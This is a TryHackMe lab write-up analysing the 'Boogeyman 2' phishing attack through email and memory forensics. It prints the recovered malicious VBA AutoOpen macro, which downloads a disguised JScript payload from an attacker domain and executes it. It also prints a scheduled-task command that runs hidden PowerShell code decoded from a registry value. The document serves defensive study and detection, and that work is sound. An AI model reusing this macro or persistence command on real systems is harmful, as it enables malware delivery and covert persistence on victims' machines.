@@ -1,0 +1,135 @@
+# Room Name - TryHackMe: Boogeyman 2
+
+Date: 08 October 2026
+
+Difficulty: Medium
+
+Category: Phishing analysis, memory forensics
+
+# Scenario
+
+After a severe attack from the Boogeyman threat group, Quick Logistics LLC improved its security defences. The Boogeyman returned with new tactics, techniques and procedures. Maxine, a human resource specialist, received a job application email with a malicious resume attached. Opening the document compromised her workstation. The security team flagged suspicious commands on her machine, and my task was to analyse the phishing email and a memory dump of the workstation to assess the impact of the compromise.
+
+# Tools Used
+
+- Email client preview to review the phishing email headers and attachment
+- md5sum to hash the malicious attachment
+- olevba (oletools) to extract and analyse VBA macros
+- Volatility 3 for memory forensics (pstree, cmdline, netscan)
+- strings and grep to search raw memory for persistence artefacts
+
+# What I Did
+
+I started with the phishing email. The headers showed the sender, the recipient and an attachment named Resume_WesleyTaylor.doc. I hashed the attachment to get an indicator for threat intelligence lookups.
+
+```bash
+md5sum Resume_WesleyTaylor.doc
+```
+
+```
+52c4384a0b9e248b95804352ebec6c5b  Resume_WesleyTaylor.doc
+```
+
+Next I analysed the document with olevba. It contained an AutoOpen macro that downloads a file disguised as update.png, saves it as C:\ProgramData\update.js and runs it with wscript.exe.
+
+```bash
+olevba Resume_WesleyTaylor.doc
+```
+
+```vb
+Sub AutoOpen()
+spath = "C:\ProgramData\"
+Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
+Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
+xHttp.Open "GET", "https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png", False
+xHttp.Send
+With bStrm
+    .Type = 1
+    .Open
+    .write xHttp.responseBody
+    .savetofile spath & "\update.js", 2
+End With
+Set shell_object = CreateObject("WScript.Shell")
+shell_object.Exec ("wscript.exe C:\ProgramData\update.js")
+End Sub
+```
+
+I then moved to the memory dump and used the process tree to trace the execution chain from Word to the stage 2 script and the final binary.
+
+```bash
+vol -f WKSTN-2961.raw windows.pstree.PsTree | grep wscript.exe
+vol -f WKSTN-2961.raw windows.pstree.PsTree | grep update
+```
+
+```
+***** 4260   1124   wscript.exe   0xe58f864ca0c0   6    -   3   False   2023-08-21 14:12:47.000000   N/A
+****** 6216  4260   updater.exe   0xe58f87ac0080   18   -   3   False   2023-08-21 14:12:48.000000   N/A
+```
+
+The command line plugin confirmed the file paths of the stage 2 script, the C2 binary and the attachment opened from the Outlook cache.
+
+```bash
+vol -f WKSTN-2961.raw windows.cmdline.CmdLine
+vol -f WKSTN-2961.raw windows.cmdline.CmdLine | grep Resume_WesleyTaylor
+```
+
+```
+4260   wscript.exe    wscript.exe C:\ProgramData\update.js
+6216   updater.exe    "C:\Windows\Tasks\updater.exe"
+1124   WINWORD.EXE    "C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE" /n "C:\Users\maxine.beck\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\WQHGZCFI\Resume_WesleyTaylor (002).doc
+```
+
+To identify the C2 channel, I reviewed network connections tied to updater.exe.
+
+```bash
+vol -f WKSTN-2961.raw windows.netscan.NetScan
+```
+
+```
+0xe58f87e81bf0   TCPv4   10.10.49.181   63339   128.199.95.189   8080   CLOSED        6216   updater.exe   2023-08-21 14:15:40.000000
+0xe58f8741ebf0   TCPv4   10.10.49.181   63348   128.199.95.189   8080   ESTABLISHED   6216   updater.exe   2023-08-21 14:16:05.000000
+```
+
+Finally, I searched raw memory strings for scheduled task creation to find the persistence mechanism.
+
+```bash
+strings WKSTN-2961.raw | grep schtasks
+```
+
+```
+schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))\"'
+```
+
+# What I Found
+
+- Phishing sender: westaylor23@outlook.com
+- Victim: maxine.beck@quicklogisticsorg.onmicrosoft.com
+- Malicious attachment: Resume_WesleyTaylor.doc
+- Attachment MD5: 52c4384a0b9e248b95804352ebec6c5b
+- Stage 2 download URL: https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png
+- Stage 2 payload saved as C:\ProgramData\update.js and executed by wscript.exe
+- wscript.exe ran as PID 4260 with parent PID 1124 (WINWORD.EXE)
+- Malicious binary download URL: https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.exe
+- C2 process: updater.exe, PID 6216, running from C:\Windows\Tasks\updater.exe
+- C2 connection: 128.199.95.189:8080, with an established session seen at 14:16:05 on 21 August 2023
+- Attachment opened from C:\Users\maxine.beck\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\WQHGZCFI\Resume_WesleyTaylor (002).doc
+- Persistence: scheduled task named Updater running daily at 09:00, executing a hidden PowerShell command that decodes and runs a Base64 payload stored in the debug value of HKCU\Software\Microsoft\Windows\CurrentVersion
+
+# Key Learning
+
+- Office macros with AutoOpen remain an effective initial access method, and olevba quickly exposes the download and execution logic.
+- File extensions in download URLs cannot be trusted. A file named update.png was actually a JScript payload.
+- The parent and child relationship in pstree (WINWORD.EXE to wscript.exe to updater.exe) is one of the clearest signs of macro based compromise.
+- Memory forensics can recover the original attachment path from the Outlook cache, linking the email directly to the infection.
+- Attackers increasingly store payloads in the registry and use scheduled tasks to load them, which avoids leaving a script file on disk.
+- Running strings against a memory dump is a simple but effective way to recover commands that are no longer visible in process listings.
+
+# What I Would Flag in a Real SOC
+
+- Microsoft Office processes spawning wscript.exe, cscript.exe, powershell.exe or cmd.exe
+- Executables or scripts written to C:\ProgramData or C:\Windows\Tasks by non administrative processes
+- Outbound connections to non standard ports such as 8080 from unsigned binaries in unusual directories
+- Scheduled task creation that launches PowerShell with -NonI, -W hidden and IEX
+- PowerShell reading Base64 content from registry values under HKCU\Software\Microsoft\Windows\CurrentVersion
+- Emails from free webmail domains to HR staff carrying macro enabled .doc attachments
+- Blocking the domain boogeymanisback.lol and the IP 128.199.95.189 across proxy and firewall, and sweeping the environment for the attachment hash
